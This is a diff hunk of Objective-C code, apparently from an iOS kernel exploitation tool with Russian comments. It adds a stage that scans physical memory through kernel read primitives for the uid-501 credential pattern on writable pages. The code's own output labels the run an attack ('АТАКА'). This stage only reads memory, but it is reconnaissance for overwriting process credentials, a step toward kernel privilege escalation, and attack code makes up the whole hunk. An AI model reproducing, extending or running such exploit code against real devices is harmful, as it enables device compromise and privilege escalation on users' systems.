@@ -2620,7 +2620,46 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         kpNote(r, @"  [RPT] writable cred-slot не найден — uid сидит в RO (0x18) ucred/proc_ro");
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT] выше\n"];
+    // ---- WIDE-501 2.0.63: read-only scan 0x21 frames for uid cluster ----
+    // Паттерн ucred+0x18: 0x000001f5000001f5 (uid=501,ruid=501). Ищем зеркало
+    // на ПИШУЩИХСЯ страницах. Ноль kwrite, ноль syscall в окне свопа.
+    [r appendString:@"=== WIDE-501 2.0.63: search uid cluster on 0x21 frames ===\n"];
+    {
+        const uint64_t UIDPAT = 0x000001f5000001f5ULL;
+        uint64_t wB = kconstant(physBase), wS = kconstant(physSize);
+        uint32_t nType21 = 0, nHit = 0;
+        uint64_t firstHitPA = 0, firstHitVA = 0; uint32_t firstHitOff = 0;
+        // ограничение: не больше 400 кадров типа 0x21, чтобы не зависнуть
+        uint64_t scanned = 0, max21 = 400;
+        for (uint64_t pa = wB; pa < wB + wS && nType21 < max21; pa += 0x4000) {
+            if (kpFrameTypeOf(pa) != 0x21) continue;
+            nType21++;
+            uint64_t al = phystokv(pa);
+            if (!al) continue;
+            for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                uint64_t q = early_kread64(al + o);
+                scanned++;
+                if (q != UIDPAT) continue;
+                nHit++;
+                kpNote(r, [NSString stringWithFormat:@"  [W501] ★ HIT pa=%#llx va=%#llx off=+x%x",
+                          (unsigned long long)pa, (unsigned long long)(al + o), o]);
+                if (!firstHitPA) { firstHitPA = pa; firstHitVA = al + o; firstHitOff = o; }
+                // дамп вокруг хита (только чтение)
+                uint32_t base = o >= 0x10 ? o - 0x10 : 0;
+                NSMutableString *ctx = [NSMutableString string];
+                for (uint32_t j = 0; j < 6 && base + j * 8 < 0x4000; j++)
+                    [ctx appendFormat:@" +%x:%#018llx", base + j * 8,
+                     (unsigned long long)early_kread64(al + base + j * 8)];
+                kpNote(r, [NSString stringWithFormat:@"  [W501] ctx:%@", ctx]);
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [W501] frames type21=%u qwords_scanned=%llu hits=%u",
+                  nType21, (unsigned long long)scanned, nHit]);
+        if (nHit == 0)
+            kpNote(r, @"  [W501] writable uid-зеркала НЕТ — кластер 501 только в RO (0x18)");
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501] выше\n"];
     return r;
 
 }
